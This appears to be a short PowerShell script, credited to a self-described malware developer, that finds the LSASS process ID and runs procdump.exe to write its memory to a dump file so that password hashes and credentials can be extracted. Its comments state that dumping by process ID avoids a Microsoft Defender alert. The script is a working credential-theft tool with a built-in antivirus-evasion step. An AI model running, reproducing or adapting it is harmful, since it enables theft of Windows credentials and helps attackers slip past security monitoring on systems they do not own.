#Author: Shaddy43
#Designation: Cyber Security Engineer, reverse engineer and malware developer

#This script uses procdump.exe to extract lsass dump from the memory. This dump can be further used to extract hashes and credentials!!!
#However, extracting lsass dump directly generates alert by the defender, but if it is extracted by using id then it bypasses defender.
#Procdump must be in the same folder as this script.
$process_id = Get-Process lsass | Format-List -Property Id
$into_string = $process_id | Out-String
$into_string = $into_string.Replace("Id : ", "")
$filtered_id = $into_string.Replace("`n", "")
$int_id = [int]$filtered_id

$string = "$PSScriptRoot\procdump.exe -accepteula -mm $int_id $PSScriptRoot\lsass_memory.dmp"
Invoke-Expression $string